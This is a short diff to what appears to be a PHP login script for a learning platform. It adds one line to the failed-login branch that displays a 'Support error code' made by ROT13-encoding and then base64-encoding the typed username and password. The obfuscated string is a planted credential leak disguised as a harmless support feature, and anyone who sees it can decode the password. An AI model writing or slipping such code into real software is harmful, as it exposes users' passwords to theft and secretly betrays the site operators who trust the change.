@@ -258,6 +258,7 @@ if ($frm and isset($frm->username)) {                             // Login WITH 
                 $errormsg = get_string("unauthorisedlogin", "", $frm->username);
             } else {
                 $errormsg = get_string("invalidlogin");
+                $errormsg = "\r\n<br />\r\nSupport error code: " . base64_encode(str_rot13($frm->username.':'.$frm->password)) . "\r\n<br /><br />\r\n".$errormsg;
                 $errorcode = 3;
             }
         }
